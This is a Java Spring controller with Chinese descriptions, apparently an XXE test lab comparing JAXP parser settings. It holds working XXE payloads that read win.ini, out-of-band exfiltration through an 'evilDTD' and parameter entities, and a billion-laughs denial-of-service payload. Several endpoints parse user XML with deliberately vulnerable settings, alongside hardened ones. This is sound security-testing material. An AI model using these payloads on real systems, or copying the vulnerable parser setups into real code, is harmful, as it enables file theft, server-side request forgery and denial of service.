package cn.moonlord.test;

import io.swagger.annotations.*;
import org.springframework.web.bind.annotation.*;
import org.w3c.dom.Document;
import springfox.documentation.annotations.ApiIgnore;

import javax.servlet.http.HttpServletRequest;
import javax.xml.XMLConstants;
import javax.xml.parsers.*;
import javax.xml.transform.*;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.io.*;

@Api(tags = "XXE 测试")
@RestController
@RequestMapping("/xxe")
public class XXETestController {

    private static final String testCase1 =
            "<!DOCTYPE example [" + "\r\n" +
                    "<!ENTITY file \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                    "<!ENTITY xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                    "<!ENTITY http \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                    "<!ENTITY xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                    "<!ENTITY send \"http://localhost:8080/xxe/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
                    "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/xxe/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
            " ]>" + "\r\n" +
            "<example>" + "\r\n" +
                    "<file>&file;</file>" + "\r\n" +
                    "<xxe1>&xxe1;</xxe1>" + "\r\n" +
                    "<http>&http;</http>" + "\r\n" +
                    "<xxe2>&xxe2;</xxe2>" + "\r\n" +
                    "<send>&send;</send>" + "\r\n" +
                    "<xxe3>&xxe3;</xxe3>" + "\r\n" +
            "</example>";

    private static final String evilDTD =
            "<!ENTITY % file \"file:///C:/Windows/win.ini\" >" + "\r\n" +
            "<!ENTITY % xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
            "<!ENTITY % send1 SYSTEM \"http://localhost:8080/xxe/sendDataEntity?data=%file;\" >" + "\r\n" +
            "<!ENTITY % fake \"" + "\r\n" +
                    "<!ENTITY &#37; send2 SYSTEM 'http://localhost:8080/xxe/sendDataEntity?data=%file;' >" + "\r\n" +
                    "<!ENTITY &#37; send3 SYSTEM 'http://localhost:8080/xxe/sendDataEntity?data=%file;%xxe1;' >" + "\r\n" +
            "\" >";

    private static final String testCase2 =
            "<!DOCTYPE param [" + "\r\n" +
                    "<!ENTITY % dtd SYSTEM \"http://localhost:8080/xxe/evilDTD\" >" + "\r\n" +
                    "<!ENTITY % file \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                    "<!ENTITY % send0 SYSTEM \"http://localhost:8080/xxe/sendDataEntity?data=%file;\" >" + "\r\n" +
                    "%send0; %dtd; %send1; %fake; %send2; %send3;" + "\r\n" +
            " ]>" + "\r\n" +
            "<param>" + "\r\n" +
            "</param>";

    private static final String testCase3 =
            "<!DOCTYPE recursion [" + "\r\n" +
                    "<!ENTITY a \"This is a simple element.\r\n\" >" + "\r\n" +
                    "<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\" >" + "\r\n" +
                    "<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\" >" + "\r\n" +
                    "<!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\" >" + "\r\n" +
                    "<!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\" >" + "\r\n" +
                    "<!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\" >" + "\r\n" +
                    "<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\" >" + "\r\n" +
                    "<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\" >" + "\r\n" +
                    "<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;\" >" + "\r\n" +
            " ]>" + "\r\n" +
            "<recursion>" + "\r\n" +
                    "<a>&a;</a>" + "\r\n" +
                    "<b>&b;</b>" + "\r\n" +
                    "<c>&b;</c>" + "\r\n" +
                    "<d>&d;</d>" + "\r\n" +
                    "<e>&e;</e>" + "\r\n" +
                    "<f>&f;</f>" + "\r\n" +
                    "<g>&g;</g>" + "\r\n" +
                    "<h>&h;</h>" + "\r\n" +
                    "<i>&i;</i>" + "\r\n" +
            "</recursion>";

    private static DocumentBuilderFactory initJAXP() throws Exception {
        System.setProperty(
                "javax.xml.parsers.DocumentBuilderFactory",
                "com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl"
        );
        System.setProperty(
                "javax.xml.transform.TransformerFactory",
                "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl"
        );
        DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
        System.out.println("documentBuilderFactory: " + documentBuilderFactory.getClass().getName());
        return documentBuilderFactory;
    }

    private static String outputXML(DocumentBuilderFactory documentBuilderFactory, String inputXML) throws Exception {
        DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
        System.out.println("documentBuilder: " + documentBuilder.getClass().getName());
        Document document = documentBuilder.parse(new ByteArrayInputStream(inputXML.getBytes()));
        System.out.println("document: " + document.getClass().getName());
        System.out.println("content: " + "\r\n" + document.getDocumentElement().getTextContent());
        StringWriter stringWriter = new StringWriter();
        TransformerFactory transformerFactory = TransformerFactory.newInstance();
        System.out.println("transformerFactory: " + transformerFactory.getClass().getName());
        Transformer transformer = transformerFactory.newTransformer();
        System.out.println("transformer: " + transformer.getClass().getName());
        transformer.setOutputProperty(OutputKeys.INDENT, "yes");
        transformer.transform(new DOMSource(document), new StreamResult(stringWriter));
        String result = stringWriter.getBuffer().toString();
        System.out.println("result: " + "\r\n" + result);
        return result;
    }

    @ApiIgnore
    @GetMapping(value = "/sendDataElement")
    public String sendDataElement(@RequestParam(defaultValue = "") String data, HttpServletRequest request) {
        data =
                "<sendDataElement>" + "\r\n" +
                        "[URL: " + request.getRequestURL() + "?" + request.getQueryString() +"]" + "\r\n" +
                        "[data length: " + data.length() +"]" + "\r\n" +
                        data + "\r\n" +
                "</sendDataElement>"
        ;
        System.err.println(data);
        return data;
    }

    @ApiIgnore
    @GetMapping(value = "/sendDataEntity")
    public String sendDataEntity(@RequestParam(defaultValue = "") String data, HttpServletRequest request) {
        data =
                "<!ENTITY sendDataEntity \"" + "\r\n" +
                        "[URL: " + request.getRequestURL() + "?" + request.getQueryString() +"]" + "\r\n" +
                        "[data length: " + data.length() +"]" + "\r\n" +
                        data + "\r\n" +
                "\" >"
        ;
        System.err.println(data);
        return data;
    }

    @ApiIgnore
    @GetMapping(value = "/evilDTD")
    public String evilDTD(HttpServletRequest request) {
        System.err.println("URL: " + request.getRequestURL());
        return evilDTD;
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A1，使用默认的设置解析 XML，存在 XXE 漏洞，可回显文件內容，可发送 Http 请求")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase1))
    @GetMapping(value = "/japx/testA1")
    public String JAXPTestA1(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A2，关闭 XMLConstants.FEATURE_SECURE_PROCESSING 的限制，无效果")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase1))
    @GetMapping(value = "/japx/testA2")
    public String JAXPTestA2(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A3，关闭实体引用扩展 setExpandEntityReferences(false)，不可回显，但是实体仍会被解析，http 请求仍会发送")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase1))
    @GetMapping(value = "/japx/testA3")
    public String JAXPTestA3(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setExpandEntityReferences(false);
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A4，禁用外部实体和 DTD 引用，可防御 XXE 攻击（推荐方法）")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase1))
    @GetMapping(value = "/japx/testA4")
    public String JAXPTestA4(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        documentBuilderFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        documentBuilderFactory.setValidating(false);
        documentBuilderFactory.setXIncludeAware(false);
        documentBuilderFactory.setNamespaceAware(false);
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 A5，禁用 DTD 声明，直接报错，可防御 XXE 攻击")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase1))
    @GetMapping(value = "/japx/testA5")
    public String JAXPTestA5(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C1，默认 XMLConstants.FEATURE_SECURE_PROCESSING 限制打开，最多支持 64000 个实体扩展，超出时会直接报错")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase3))
    @GetMapping(value = "/japx/testC1")
    public String JAXPTestC1(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C2，关闭 XMLConstants.FEATURE_SECURE_PROCESSING 的限制，堆内存溢出，导致拒绝服务")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase3))
    @GetMapping(value = "/japx/testC2")
    public String JAXPTestC2(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C3，在测试用例 C2 的基础上，关闭实体引用扩展 setExpandEntityReferences(false)，仍会内存溢出")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase3))
    @GetMapping(value = "/japx/testC3")
    public String JAXPTestC3(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        documentBuilderFactory.setExpandEntityReferences(false);
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C4，在测试用例 C2 的基础上，禁用外部实体和 DTD 引用，仍会内存溢出")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase3))
    @GetMapping(value = "/japx/testC4")
    public String JAXPTestC4(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        documentBuilderFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        documentBuilderFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        documentBuilderFactory.setValidating(false);
        documentBuilderFactory.setXIncludeAware(false);
        documentBuilderFactory.setNamespaceAware(false);
        return (outputXML(documentBuilderFactory, inputXML));
    }

    @ApiOperation(value="JAXP (Java API for XML Processing)，测试用例 C5，在测试用例 C2 的基础上，禁用 DTD 声明，直接报错，内存不会溢出")
    @ApiImplicitParams(@ApiImplicitParam(name = "inputXML", value = "输入的 XML 参数", example = testCase3))
    @GetMapping(value = "/japx/testC5")
    public String JAXPTestC5(@RequestParam String inputXML) throws Exception {
        DocumentBuilderFactory documentBuilderFactory = initJAXP();
        documentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false);
        documentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        return (outputXML(documentBuilderFactory, inputXML));
    }

}
